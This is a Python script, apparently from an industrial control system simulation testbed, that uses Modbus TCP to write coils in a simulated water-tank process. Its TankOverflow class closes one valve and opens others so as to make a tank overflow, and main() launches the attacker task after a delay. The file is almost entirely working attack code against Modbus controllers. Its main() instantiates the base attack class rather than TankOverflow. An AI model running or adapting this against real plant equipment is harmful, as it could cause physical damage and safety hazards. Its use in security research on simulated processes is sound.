import argparse
import os
import sys
import time
from datetime import datetime
import random
import logging

from pymodbus.client.sync import ModbusTcpClient
from pyics.mtu import MTU
from pyics.utils import *

sys.path.insert(0, "../examples/medium-process")
from constants import *

class MTUAttack(MTU):

    def __init__(self, ip, port, export_file, client=ModbusTcpClient):

        self.varmap = {
                        WM: False,
                        VT1: False,
                        V1: False,
                        V2: False,
                        VS1: False,
                        VS2: False,
                        VTF: False,
                        VTC: False,
                        M1: False,
                        M2: False,
                        WO: False
                      }

        self.export_file = export_file

        super(MTUAttack, self).__init__(ip, port, client)


    def change_coil(self, name, val):
        self.varmap[name] = val
        self.write_variable(name, val)

class TankOverflow(MTUAttack):

    def main_loop(self, *args, **kwargs):
        self.export_file.write("[{}] Running attack\n".format(datetime.now()))
        self.change_coil(VTF, False)
        self.change_coil(V1, True)
        self.change_coil(V2, True)
        num = random.randint(0, 5)
        if num == 5:
            self.change_coil(VT1, True)
        else:
            self.change_coil(VT1, False)

def main(ip, port, period, duration, dirname, export, start):
    time.sleep(start)
    with open(export, "w") as fname:
        mtu = MTUAttack(ip, port, fname)
        mtu.get_dir(dirname)
        mtu.create_task('attacker', period, duration)
        mtu.start()
        mtu.wait_end()

if  __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", action="store", dest="ip")
    parser.add_argument("--port", type=int, action="store", dest="port")
    parser.add_argument("--period", type=float, default=1, action="store",
                        dest="period")
    parser.add_argument("--duration", type=int, default=60, action="store", dest="duration")
    parser.add_argument("--import", action="store", dest="dirname")
    parser.add_argument("--start", type=int, default=120, action="store", dest="start")
    parser.add_argument("--export", action="store", dest="export")

    args = parser.parse_args()
    main(args.ip, args.port, args.period, args.duration, args.dirname, args.export, args.start)
